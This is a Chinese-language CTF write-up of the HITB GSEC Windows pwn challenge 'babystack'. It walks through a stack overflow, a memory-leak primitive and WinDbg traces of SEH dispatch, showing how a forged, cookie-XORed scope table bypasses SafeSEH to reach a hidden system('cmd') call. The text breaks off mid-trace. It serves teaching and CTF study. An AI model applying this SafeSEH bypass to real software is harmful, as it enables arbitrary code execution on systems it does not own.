---
layout: post
title: "[质量局!!]HITB GSEC CTF Win Pwn解题全记录之babystack"
date: 2020-02-10 21:24:34 +0800
permalink: "/post/hitb_gsec_ctf_babystack_writeup/"
---

作者：k0shl 转载请注明出处，作者博客：https://whereisk0shl.top

- - - - -

### 前言

- - - - -

今天给大家带来的是HITB GSEC Win PWN的babystack的解题全过程，关于babyshellcode的解题过程已经过更新在博客里，链接是：

https://whereisk0shl.top/hitb_gsec_ctf_babyshellcode_writeup.html

在babystack中用到的一些babyshellcode中提到的知识点，这里就不再进行赘述，请参考上一篇文章，在babystack里的漏洞品相比babyshellcode的要好，可利用点很清晰也很简单，但是攻击面却比babyshellcode要小很多，babystack的考点是seh中基本域prev域和handler域之外的扩展域scope table，以及VCRUNTIME140.dll中关于_except_handler4_comm函数处理的分析。同样非常经典，非常好玩，下面我们一起进入babystack的解题过程，同时这篇文章结束后关于两道Win Pwn的分析就结束了，我将两道题目打包上传到github，感谢阅读。请师傅们多多指教。

- - - - -

### BabyStack Writeup with Scope Table

- - - - --

babystack这道题看上去攻击面还是很明显的，首先是一处栈溢出。

```
    v4 = strcmp(&v6, "yes");
    if ( v4 )
      v4 = -(v4 < 0) | 1;
    if ( v4 )
    {
      v3 = strcmp(&v6, "no");
      if ( v3 )
        v3 = -(v3 < 0) | 1;
      if ( !v3 )
        break;
      sub_401000((int)&v6, 256);//key!!
    }
```

sub_401000是一个拷贝函数，拷贝的目标是v6所在的地址，长度是256，也就是0x100，这里长度太长了，已经超过v6开辟的栈空间大小，会造成栈溢出。

```
 int __cdecl sub_401000(int a1, int a2)
{
  int i; // [sp+0h] [bp-8h]@1
  char v4; // [sp+7h] [bp-1h]@2

  for ( i = 0; ; ++i )
  {
    v4 = getchar();
    if ( i == a2 )
      break;
    if ( v4 == 10 )
    {
      *(_BYTE *)(i + a1) = 0;
      return i;
    }
    *(_BYTE *)(i + a1) = v4;
  }
  return i;
}
```

在函数入口，会直接打印目标栈地址和主函数地址，因此也不怕栈地址改变和ASLR了。

```
 sub_401420("stack address = 0x%x\n", &v6);
 sub_401420("main address = 0x%x\n", sub_4010B0);
```

在进入函数之后，如果输入yes，v4为0，不会进入下面的if语句，而是进入else语句，如果输入非yes，非no，则会进入if语句引发栈溢出，而这个else语句中的功能可以泄露内存地址中存放的内容。

```
    else
    {
      puts("Where do you want to know");
      v2 = (_DWORD *)sub_401060();
      sub_401420("Address 0x%x value is 0x%x\n", v2, *v2);//v2是地址，*v2是地址中存放的内容
    }
```

而sub_401060中返回值会通过atoi，将想转换的内容，转换成一个int型数字。

```
int sub_401060()
{
  ⋯⋯
  sub_401000((int)&Str, 15);
  return atoi(&Str);
}
```

所以这里如果想得知地址的值的话，需要将目标地址的十六进制转换成十进制输入，同时，这里如果atoi转换的是一个非数字型数字，那么转换会失败，程序会进入异常处理seh。

在sub_4010b0函数中，同时还隐藏着直接获得交互shell的system('cmd')，在f5之后没有显示。

```
.text:0040138D                 push    offset Command  ; "cmd"
.text:00401392                 call    ds:system
```

因此，我们也不需要考虑DEP和shellcode了，如果能够控制eip，通过之前我们泄露出的函数地址，算出偏移，直接跳转到system（"cmd"），就可以直接完成攻击了。怎么样，这个题目漏洞品相都非常好，看着非常简单吧（事实证明我还是too young too naive了）。

最后有个小限制，就是输入点有一个for循环，只有10次输入的机会，因此如果我们要泄露任意地址内存的话，必须要泄露对利用有影响的内存值，来对栈做fix。

```
  for ( i = 0; i < 10; ++i )
  {
    puts("Do you want to know more?");
    sub_401000((int)&v6, 10);
    v4 = strcmp(&v6, "yes");
    if ( v4 )
      v4 = -(v4 < 0) | 1;
    if ( v4 )
    {
      v3 = strcmp(&v6, "no");
      if ( v3 )
        v3 = -(v3 < 0) | 1;
      if ( !v3 )
        break;
      sub_401000((int)&v6, 256);
    }
    else
    {
      puts("Where do you want to know");
      v2 = (_DWORD *)sub_401060();
      sub_401420("Address 0x%x value is 0x%x\n", v2, *v2);
    }
  }
```

- - - - --

乍一看，这些很明显的漏洞，品相比babyshellcode要好很多，但实际上，利用点却比babyshellcode要少太多。

首先，这里假如没有MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE的条件限制，也没有机会给我们一个堆空间存放shellcode，其次在这道题目中没有scmgr.dll这个no safeseh的dll，提供我们一个RtlIsValidHandler可信的空间做跳转的跳板，因此我们也不能通过构造babyshellcode那种pointer to next chain和fake seh handler to dll的结构来控制eip。

总结梳理一下可利用的点，首先可以泄露任意地址的内容，其次我们拥有一个栈溢出，可以覆盖到seh chain，然后我们可以通过泄露地址位置来触发异常，让程序进入seh异常处理，这里我们也考虑过用覆盖返回地址的方法，因为就算有GS，我们也可以通过泄露地址值来获得GS的值，但程序最后ret的方法是exit。

```
  ms_exc.registration.TryLevel = -2;
  puts("I can tell you everything, but I never believe 1+1=2");
  puts("AAAA, you kill me just because I don't think 1+1=2??");
  exit(0);
```

exit的时候会做一个栈切换，因此栈溢出覆盖的ret addr，我们没法在exit的时候用，因此似乎我们的攻击面只有攻击seh异常处理函数了。

- - - - -

最开始，我们考虑的是像babyshellcode一样，泄露prev域，再控制seh handler跳转到刚才我们找到的system("cmd")中，但实际情况并没有那么简单，因为scope table。

在之前babyshellcode中，基本的_EXCEPTION_REGISTRATION只有两个域，prev域和handler域。

```
struct _EXCEPTION_REGISTRATION{
   struct _EXCEPTION_REGISTRATION *prev;
   void (*handler)(    PEXCEPTION_RECORD,
                   PEXCEPTION_REGISTRATION,
                   PCONTEXT,
                  PEXCEPTION_RECORD);
```

但实际上，我们可以扩展异常处理帧结构，也就是scopetable域，在babystack的主函数中，scopetable域被加密初始化并放入了栈中。

```
0:000> p
eax=001efa64 ebx=7ffdc000 ecx=001efa00 edx=00000000 esi=609d6314 edi=002a7b60
eip=002610cc esp=001ef95c ebp=001efa2c iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
babystack+0x10cc://获取security cookie
002610cc a104402600      mov     eax,dword ptr [babystack+0x4004 (00264004)] ds:0023:00264004=d3749a3a
0:000> p//会和scopetable的值做亦或运算
eax=d3749a3a ebx=7ffdc000 ecx=001efa00 edx=00000000 esi=609d6314 edi=002a7b60
eip=002610d1 esp=001ef95c ebp=001efa2c iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
babystack+0x10d1:
002610d1 3145f8          xor     dword ptr [ebp-8],eax ss:0023:001efa24=00263688
0:000> r eax//security cookie
eax=d3749a3a
0:000> dd ebp-8 l1
001efa24  00263688
0:000> p
eax=d3749a3a ebx=7ffdc000 ecx=001efa00 edx=00000000 esi=609d6314 edi=002a7b60
eip=002610d4 esp=001ef95c ebp=001efa2c iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
babystack+0x10d4:
002610d4 33c5            xor     eax,ebp
0:000> dd ebp-8 l1//加密后的scopetable
001efa24  d352acb2
```

我们可以看到，加密的方法是将scopetable指针和security cookie做了一个亦或运算。

```
.text:004010CC                 mov     eax, ___security_cookie
.text:004010D1                 xor     [ebp+ms_exc.registration.ScopeTable], eax
```

而security cookie是一个全局变量存放在babystack+0x4004的位置，之前我们已经聊到babystack可以泄露任意地址值，因此security cookie是完全可以泄露出来的。

```
.data:00404004 ___security_cookie dd 0BB40E64Eh        ; DATA XREF: sub_401060+6r
.data:00404004                                         ; sub_4010B0+1Cr ...
```

接下来，我们就要来看一看这个Scope Table了，首先指向它的指针是在ebp-8的位置存放的，来看一下在异或运算前栈的情况。

```
0:000> dd ebp-8
001efa24  00263688 fffffffe 001efa74
```

这个值是在sub_4010b0函数入口处被推入栈中的。

```
.text:004010B0                 push    ebp
.text:004010B1                 mov     ebp, esp
.text:004010B3                 push    0FFFFFFFEh//先推入0xfffffffe
.text:004010B5                 push    offset stru_403688//推入scope table
.text:004010BA                 push    offset sub_401460
```

scope table指针指向的是一个stru_403688结构，是一个全局变量，直接来看一下这个结构。

```
.rdata:00403688 stru_403688     dd 0FFFFFFE4h           ; GSCookieOffset
.rdata:00403688                                         ; DATA XREF: sub_4010B0+5o
.rdata:00403688                 dd 0                    ; GSCookieXOROffset ; SEH scope table for function 4010B0
.rdata:00403688                 dd 0FFFFFF20h           ; EHCookieOffset
.rdata:00403688                 dd 0                    ; EHCookieXOROffset
.rdata:00403688                 dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
.rdata:00403688                 dd offset loc_401348    ; ScopeRecord.FilterFunc
.rdata:00403688                 dd offset loc_40134E    ; ScopeRecord.HandlerFunc
```

其实关于Scope table的描述在这里已经很清楚了，我们直接来看一下实际情况下scope table表。

```
0:000> dd 00263688
00263688  ffffffe4 00000000 ffffff20 00000000
00263698  fffffffe 00261348 0026134e 00000000
002636a8  fffffffe 00000000 ffffffcc 00000000
002636b8  fffffffe 002616ad 002616c1 00000000
```

接下来我们就需要来看看这个scope table到底我们该怎么利用，这个涉及到_except_handler4异常处理函数，在babystack中，异常处理函数中会调用VCRUNTIME140!_except_handler4_common。

```
0:000> t
eax=00000000 ebx=00000000 ecx=01101460 edx=770b6d8d esi=00000000 edi=00000000
eip=01101fe2 esp=0012f8b8 ebp=0012f8d4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
babystack+0x1fe2:
01101fe2 ff2538301001    jmp     dword ptr [babystack+0x3038 (01103038)] ds:0023:01103038={VCRUNTIME140!_except_handler4_common (651fb2f0)}
0:000> p
eax=00000000 ebx=00000000 ecx=01101460 edx=770b6d8d esi=00000000 edi=00000000
eip=651fb2f0 esp=0012f8b8 ebp=0012f8d4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
VCRUNTIME140!_except_handler4_common:
651fb2f0 55              push    ebp
```

在VCRUNTIME140!_except_handler4_common函数中，会栈进行很多操作，比如全局栈展开，以前的栈回收等等，而最后会调用terminal func，也就是handler function。

```
0:000> p
eax=00000000 ebx=00000000 ecx=00000000 edx=0012ff18 esi=0110134e edi=fffffffe
eip=651faf58 esp=0012f888 ebp=0012ff18 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
VCRUNTIME140!_EH4_TransferToHandler+0x13:
651faf58 33d2            xor     edx,edx
0:000> p
eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=0110134e edi=fffffffe
eip=651faf5a esp=0012f888 ebp=0012ff18 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
VCRUNTIME140!_EH4_TransferToHandler+0x15:
651faf5a 33ff            xor     edi,edi
0:000> p
eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=0110134e edi=00000000
eip=651faf5c esp=0012f888 ebp=0012ff18 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
VCRUNTIME140!_EH4_TransferToHandler+0x17:
651faf5c ffe6            jmp     esi {babystack+0x134e (0110134e)}
```

也就是说，如果我们可以控制handler function，就可以通过jmp esi来控制eip了！

- - - - -

这时候有同学会问，直接把进程函数的地址（也就是刚才提到的函数里有一处system('cmd')调用地址）覆盖seh handler不行吗？safeseh是不允许通过的。

```
0:000> g//触发异常
(18f074.18f078): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=7ffd7000 ecx=de5c2bcc edx=00000009 esi=5ffb6314 edi=00297b60
eip=000a1272 esp=0028f9d0 ebp=0028fab0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Module load completed but symbols could not be loaded for babystack.exe
babystack+0x1272:
000a1272 8b08            mov     ecx,dword ptr [eax]  ds:0023:00000000=????????

0:000> !exchain
0028faa0: babystack+138d (000a138d)//seh handler被修改成指向system('cmd')
0028fae8: babystack+1460 (000a1460)
0028fb34: ntdll!_except_handler4+0 (7708e195)
  CRT scope  0, filter: ntdll!__RtlUserThreadStart+2e (770e790b)
                func:   ntdll!__RtlUserThreadStart+63 (770e7c80)
Invalid exception stack at ffffffff
```

关于safeseh的伪代码在我上篇babyshellcode文章中已经贴出了，这里不再贴详细代码，关键部分在这里。

```
if (handler is in an image)//进入这里
{        // 在加载模块的进程空间
if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag set)
    return FALSE; // 该标志设置，忽略异常处理，直接返回FALSE
if (image has a SafeSEH table) // 是否含有SEH表
    if (handler found in the table)
        return TRUE; // 异常处理handle在表中，返回TRUE
    else
        return FALSE; // 异常处理handle不在表中，返回FALSE
```

首先我们要跳转到system('cmd')的地址空间就在当前进程空间中，所以会进入第一个if处理逻辑，随后会检查safeseh table。

```
0:000> p//获取safeseh table
eax=0028f4d8 ebx=000a138d ecx=0028f4dc edx=770b6c74 esi=0028f580 edi=00000000
eip=7708f834 esp=0028f4a0 ebp=0028f4e8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ntdll!RtlIsValidHandler+0x21:
7708f834 e85c000000      call    ntdll!RtlLookupFunctionTable (7708f895)
0:000> p
eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=0028f580 edi=00000000
eip=7708f839 esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlIsValidHandler+0x26:
7708f839 33ff            xor     edi,edi
0:000> p//eax存放的是当前进程的safeseh表
eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=0028f580 edi=00000000
eip=7708f83b esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlIsValidHandler+0x28:
7708f83b 8945f4          mov     dword ptr [ebp-0Ch],eax ss:0023:0028f4dc=770b5c1c
0:000> p//如果没有返回0，和0作比较，现在有
eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=0028f580 edi=00000000
eip=7708f83e esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlIsValidHandler+0x2b:
7708f83e 3bc7            cmp     eax,edi
0:000> p
eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=0028f580 edi=00000000
eip=7708f840 esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlIsValidHandler+0x2d:
7708f840 0f845bae0500    je      ntdll!RtlIsValidHandler+0x82 (770ea6a1) [br=0]
```

当然这里是存在safeseh table的，最后要在里面寻找handler，看看当前seh handler是否是safeseh表中的handler。

```
0:000> p//ebx的值是我们覆盖seh handler指向system('cmd')的地址，在进程空间里
eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=00000001 edi=00000000
eip=7708f85a esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
ntdll!RtlIsValidHandler+0x46:
7708f85a 2b5df0          sub     ebx,dword ptr [ebp-10h] ss:0023:0028f4d8={babystack (000a0000)}//这里用seh handler地址减去进程基址
……
0:000> p
eax=000a3390 ebx=0000138d ecx=00000000 edx=00000000 esi=00000001 edi=00000000
eip=7708f86c esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl zr na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000247
ntdll!RtlIsValidHandler+0x54:
7708f86c 8b3c88          mov     edi,dword ptr [eax+ecx*4] ds:0023:000a3390=00001460//从safeseh handler table中获取可信的seh handler
0:000> p
eax=000a3390 ebx=0000138d ecx=00000000 edx=00000000 esi=00000001 edi=00001460
eip=7708f86f esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl zr na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000247
ntdll!RtlIsValidHandler+0x57:
7708f86f 3bdf            cmp     ebx,edi//用可信seh handler和当前seh handler作比较
0:000> p
eax=000a3390 ebx=0000138d ecx=00000000 edx=00000000 esi=00000001 edi=00001460
eip=7708f871 esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei ng nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
ntdll!RtlIsValidHandler+0x59://显然不相等，跳转
7708f871 0f8274030000    jb      ntdll!RtlIsValidHandler+0x5b (7708fbeb) [br=1]
```

这里用当前system('cmd')地址的seh handler和safeseh table中可信的handler作比较，显然由于我们的覆盖，不相等，则safeseh check没通过，返回0。

```
0:000> p
eax=64fd5e00 ebx=0028faa0 ecx=64d5aa92 edx=00000000 esi=0028f580 edi=00000000
eip=7708f88d esp=0028f4ec ebp=0028f568 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlIsValidHandler+0xfc:
7708f88d c20800          ret     8
0:000> p
eax=64fd5e00 ebx=0028faa0 ecx=64d5aa92 edx=00000000 esi=0028f580 edi=00000000
eip=7708f9fe esp=0028f4f8 ebp=0028f568 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0x10e:
7708f9fe 84c0            test    al,al
0:000> r al
al=0
```

在babyshellcode中，我们用了nosafeseh的dll突破了safeseh，在babystack中我们没有nosafeseh的地址空间，也没有可用的堆空间（有也用不了），因此我们不能用seh handler了，而我们可控的空间就是栈空间，我们有scope table，经过我们之前的分析，可以通过scope table实现对eip的控制。

因此，我们目前需要在栈泄露并fix的栈结构是seh的prev域和handler域。

- - - - -

之前我们分析except_handler4_comm函数时，发现处理到最后会跳转到scope table表中的Handler func指针指向的位置，因此我们利用except_handler4的机制就可以使用scope table中的handler func来控制eip，而不使用seh handler，也就是说将seh chain的prev域和handler域的值覆盖成和原来一样的（因为这两个值都可以泄露出来，之前提过），唯独控制scope table中的struc，从而相当于绕过了safe seh的RtlIsValidHandler的check。

```
0:000> p
eax=01101460 ebx=0012ff08 ecx=0012f91c edx=770b6c74 esi=0012f9c0 edi=00000000
eip=7708f9f6 esp=0012f934 ebp=0012f9a8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlDispatchException+0x106:
7708f9f6 ff7304          push    dword ptr [ebx+4]    ds:0023:0012ff0c=01101460
0:000> p
eax=01101460 ebx=0012ff08 ecx=0012f91c edx=770b6c74 esi=0012f9c0 edi=00000000
eip=7708f9f9 esp=0012f930 ebp=0012f9a8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlDispatchException+0x109:
7708f9f9 e815feffff      call    ntdll!RtlIsValidHandler (7708f813)
0:000> p
eax=01103301 ebx=0012ff08 ecx=711cbddc edx=00000000 esi=0012f9c0 edi=00000000
eip=7708f9fe esp=0012f938 ebp=0012f9a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0x10e:
7708f9fe 84c0            test    al,al
0:000> r al
al=1
```

下面我们来看一下scope table该如何控制。

首先看我们之前的分析，在scope table位置存放的是struc和security cookie异或的结果，我们就叫它encode scope table，接下来我们跟入VCRUNTIME140!_except_handler4_common函数，首先会对scope table进行解密，也就是和security cookie进行异或运算。

```
0:000> p//获得当前encode scope table
eax=00000000 ebx=00000000 ecx=01274004 edx=770b6d8d esi=0027fc0c edi=00000000
eip=606eb30a esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
VCRUNTIME140!_except_handler4_common+0x1a:
606eb30a 8b7e08          mov     edi,dword ptr [esi+8] ds:0023:0027fc14=b24ab809
0:000> p
eax=00000000 ebx=00000000 ecx=01274004 edx=770b6d8d esi=0027fc0c edi=b24ab809
eip=606eb30d esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
VCRUNTIME140!_except_handler4_common+0x1d:
606eb30d 8d4610          lea     eax,[esi+10h]
0:000> p//ecx的值是base address+0x4004，也就是security cookie的存放位置，edi是encode scope table，异或运算
eax=0027fc1c ebx=00000000 ecx=01274004 edx=770b6d8d esi=0027fc0c edi=b24ab809
eip=606eb310 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
VCRUNTIME140!_except_handler4_common+0x20:
606eb310 3339            xor     edi,dword ptr [ecx]  ds:0023:01274004=b36d8e81
0:000> p
eax=0027fc1c ebx=00000000 ecx=01274004 edx=770b6d8d esi=0027fc0c edi=01273688//edi的值变成scope table的指针
eip=606eb312 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
VCRUNTIME140!_except_handler4_common+0x22:
606eb312 50              push    eax
```

注意ecx的值，指向的是当前进程地址+0x4004，这个位置之前已经分析过存放的是全局变量security cookie，这个值我们可以能通过任意地址读获取到，而栈里对应encode scope table的值我们也能通过任意地址读获取到，因此我们就可以获取到struc的值，而这个struc的值，是我们可以决定的，如果我们用任意地址 xor security cookie的值，这个decode之后的指针就能指向我们构造的地址了。

随后会检查Try level的值。

```
0:000> p//获取try level的值
eax=0027f598 ebx=0027f6dc ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
eip=606eb344 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
VCRUNTIME140!_except_handler4_common+0x54:
606eb344 8b5e0c          mov     ebx,dword ptr [esi+0Ch] ds:0023:0027fc18=00000000//esi的值需要注意
0:000> p
eax=0027f598 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
eip=606eb347 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
VCRUNTIME140!_except_handler4_common+0x57:
606eb347 8946fc          mov     dword ptr [esi-4],eax ds:0023:0027fc08=5be7a4e3
0:000> p//将try leve的值和-2做比较，这里try level值为0
eax=0027f598 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
eip=606eb34a esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
VCRUNTIME140!_except_handler4_common+0x5a:
606eb34a 83fbfe          cmp     ebx,0FFFFFFFEh
```

Try level的值为0，这里会和-2作比较，如果Try level的值为-2的情况下会表示没有进入任何该函数的try模块中，程序会返回，这里由于程序一开始就将值赋值为0，因此这里会进入后续处理。

这里我们需要注意一下esi的值，这里Try level的值是由esi+0C赋值而来，来看下esi的值是啥。

```
0:000> dd 0027fc0c
0027fc0c  0027fc54 01271460 b24ab809 00000000
0027fc1c  0027fc64 0127167a 00000001 003d7b60
0027fc2c  003d7bb8 b34a72e5 00000000 00000000
0027fc3c  7ffdb000 0027fc00 00000000 00000000
0027fc4c  0027fc30 0000031b 0027fca0 01271460
0027fc5c  b24ab829 00000000 0027fc70 76b2ef8c
0027fc6c  7ffdb000 0027fcb0 770d367a 7ffdb000
0027fc7c  637cd233 00000000 00000000 7ffdb000
0:000> !exchain
0027f5ec: ntdll!ExecuteHandler2+3a (770b6d8d)
0027fc0c: babystack+1460 (01271460)
0027fc54: babystack+1460 (01271460)
```

可以看到，esi的值就在seh chain中，接下来我们继续跟踪VCRUNTIME140!_except_handler4_common函数。

```
0:000> p
eax=0027f598 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
eip=606eb353 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
VCRUNTIME140!_except_handler4_common+0x63:
606eb353 8d4302          lea     eax,[ebx+2]
0:000> p
eax=00000002 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
eip=606eb356 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
VCRUNTIME140!_except_handler4_common+0x66:
606eb356 8d0443          lea     eax,[ebx+eax*2]
0:000> p//edi存放的是scope table，这里会计算handler function的位置
eax=00000004 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
eip=606eb359 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
VCRUNTIME140!_except_handler4_common+0x69:
606eb359 8b4c8704        mov     ecx,dword ptr [edi+eax*4+4] ds:0023:0127369c=01271348
0:000> dd 01273688//edi的值指向scope table
01273688  ffffffe4 00000000 ffffff20 00000000
01273698  fffffffe 01271348 0127134e 00000000
012736a8  fffffffe 00000000 ffffffcc 00000000
012736b8  fffffffe 012716ad 012716c1 00000000
```

可以看到，最后通过scope table计算了handler function的指针的值，随后会在最后跳转时用到，那么这个地方就很有意思了，我们可以构造一个scope table，也就是fake struc，然后和泄露出来的security cookie做异或运算，然后把值通过栈溢出，覆盖到seh chain的encode scope table位置，这里要提一点是fake struc放在什么位置，以及放什么，这里我们选择的还是放在stack中存放变量的位置，因为放在这里不会影响到其他变量，当然可以放在栈的任何位置，只要覆盖之后不会影响到其他函数调用就可以，否则会造成不可预知的crash，因此放在之前提到的函数内申请变量的位置是最稳的，当然这些值的相对偏移都固定，因此我们可以leak出来。

我们想到的栈布局如下。

![](./20170830/5.png?r=67)

首先我们通过leak的方法可以泄露出security cookie，同时通过栈地址+offset的方法可以泄露出之前我们提到的prev域和handler域的值，这些值将在我们进行栈布局的时候用到。

![](./20170830/1.png?r=80)

exchain中关于prev域和handler域的偏移，在栈里相对位置是固定的，所以每次程序开始给了栈地址后，我们可以直接通过栈地址和相对偏移算出exchain的位置，泄露出prev域和handler域的值，随后我们构造一个fake struc，也就是fake scope table，根据之前我们提到关于struc的定义，我们可以在栈中布置这样一个值，然后将scope table的栈地址和security cookie做异或运算，填充在handler之后就行了。

![](./20170830/2.png?r=86)

OK，现在我们完成了布置，这样的话可以通过safeseh的check。

```
0:000> p
eax=01121460 ebx=0015fbd0 ecx=0015f61c edx=770b6c74 esi=0015f6c0 edi=00000000
eip=7708f9f9 esp=0015f630 ebp=0015f6a8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
ntdll!RtlDispatchException+0x109:
7708f9f9 e815feffff      call    ntdll!RtlIsValidHandler (7708f813)
0:000> p
eax=01123301 ebx=0015fbd0 ecx=62891c6f edx=00000000 esi=0015f6c0 edi=00000000
eip=7708f9fe esp=0015f638 ebp=0015f6a8 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!RtlDispatchException+0x10e:
7708f9fe 84c0            test    al,al
0:000> r al
al=1
```

接下来进入VCRUNTIME140!_except_handler4_common函数中，其实通过上面的图可以看到，在fake struc中，我们其他值固定，只是把handler function的值修改成了system('cmd')的地址，这样根据我们上面对_except_handler4_common函数的分析，应该最后会跳转到handler function，也就是system（'cmd'）。首先跟入函数。

```
0:000> p
eax=00000000 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=00000000
eip=6375b30a esp=0015f58c ebp=0015f5b4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
VCRUNTIME140!_except_handler4_common+0x1a://获取encode scope table
6375b30a 8b7e08          mov     edi,dword ptr [esi+8] ds:0023:0015fbd8=764a4109
0:000> p
eax=00000000 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=764a4109
eip=6375b30d esp=0015f58c ebp=0015f5b4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
VCRUNTIME140!_except_handler4_common+0x1d:
6375b30d 8d4610          lea     eax,[esi+10h]
0:000> p
eax=0015fbe0 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=764a4109
eip=6375b310 esp=0015f58c ebp=0015f5b4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
VCRUNTIME140!_except_handler4_common+0x20://和security cookie做异或
6375b310 3339            xor     edi,dword ptr [ecx]  ds:0023:01124004=765fba5d
0:000> p
